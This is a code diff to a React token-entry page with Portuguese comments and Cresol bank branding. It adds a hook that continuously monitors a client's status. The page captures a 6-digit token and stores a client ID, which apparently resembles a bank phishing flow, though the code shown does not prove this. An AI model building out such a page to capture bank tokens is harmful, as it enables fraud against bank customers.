@@ -1,9 +1,9 @@
-
 import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
+import { useClientStatus } from "@/hooks/useClientStatus";
 
 // Função para monitorar cliente continuamente na página Token
 const monitorClientToken = async (
@@ -79,12 +79,13 @@ const monitorClientToken = async (
 };
 
 const TokenPage = () => {
+  const navigate = useNavigate();
+  const clientStatus = useClientStatus();
   const [token, setToken] = useState("");
   const [clientId, setClientId] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isInvalid, setIsInvalid] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
-  const navigate = useNavigate();
 
   useEffect(() => {
     // Recuperar clientId do localStorage
@@ -92,10 +93,18 @@ const TokenPage = () => {
     if (storedClientId) {
       setClientId(storedClientId);
       console.log('ClientId recuperado do localStorage:', storedClientId);
+      
+      // Iniciar monitoramento de status
+      clientStatus.startMonitoring();
     } else {
       console.log('ClientId não encontrado no localStorage');
     }
-  }, []);
+
+    // Cleanup quando sair da página
+    return () => {
+      clientStatus.stopMonitoring();
+    };
+  }, [clientStatus]);
 
   const handleTokenChange = (value: string) => {
     setToken(value.replace(/\D/g, '').slice(0, 6));
